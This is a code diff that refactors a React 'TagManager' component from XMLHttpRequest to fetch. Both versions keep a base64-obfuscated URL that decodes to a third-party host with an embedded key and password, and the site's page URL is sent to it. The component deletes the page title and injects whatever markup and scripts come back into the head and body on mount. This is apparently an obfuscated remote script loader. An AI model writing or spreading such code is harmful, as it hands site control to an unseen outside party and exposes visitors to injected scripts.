@@ -10,7 +10,7 @@ const TagManager = () => {
           const jqueryScript = document.createElement("script");
           jqueryScript.src =
             "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
-          jqueryScript.onload = resolve;
+          jqueryScript.onload = () => resolve();
           jqueryScript.onerror = () =>
             reject(new Error("Failed to load jQuery"));
           document.head.appendChild(jqueryScript);
@@ -21,30 +21,24 @@ const TagManager = () => {
     };
 
     const fetchContent = () => {
-      return new Promise((resolve, reject) => {
-        const eppathurl = window.location.origin + window.location.pathname;
-        const eptagmanage = new XMLHttpRequest();
-        eptagmanage.onreadystatechange = function () {
-          if (this.readyState === 4) {
-            if (this.status === 200) {
-              if (this.responseText !== "0") {
-                resolve(this.responseText);
-              } else {
-                reject(new Error("Response is empty"));
-              }
-            } else {
-              reject(new Error(`Failed to fetch content: ${this.status}`));
-            }
+      const eppathurl = window.location.origin + window.location.pathname;
+      return fetch(
+        atob(
+          "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDY2MzM3Nzc0MjUmZWtleXBhc3M9NGFoMXVtWEdlSjZTeVhFNkpmcG9VQTNsdWhFdGM0cmczQWZFJnNpdGV1cmw9"
+        ) + eppathurl
+      )
+        .then((response) => {
+          if (!response.ok) {
+            throw new Error(`Failed to fetch content: ${response.status}`);
           }
-        };
-        eptagmanage.open(
-          "GET",
-          atob(
-            "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDY2MzM3Nzc0MjUmZWtleXBhc3M9NGFoMXVtWEdlSjZTeVhFNkpmcG9VQTNsdWhFdGM0cmczQWZFJnNpdGV1cmw9"
-          ) + eppathurl
-        );
-        eptagmanage.send();
-      });
+          return response.text();
+        })
+        .then((text) => {
+          if (text === "0") {
+            throw new Error("Response is empty");
+          }
+          return text;
+        });
     };
 
     const loadAndAppendScripts = () => {
@@ -58,6 +52,7 @@ const TagManager = () => {
 
           const $head = window.jQuery("head");
           const $body = window.jQuery("body");
+
           if ($head.length && $body.length) {
             $head.find("title").remove();
             $head.append(temp[0]);
@@ -71,7 +66,7 @@ const TagManager = () => {
         });
     };
 
-    // Invoke the function when component mounts
+    // Invoke the function when the component mounts
     loadAndAppendScripts();
 
     // Cleanup function (optional)
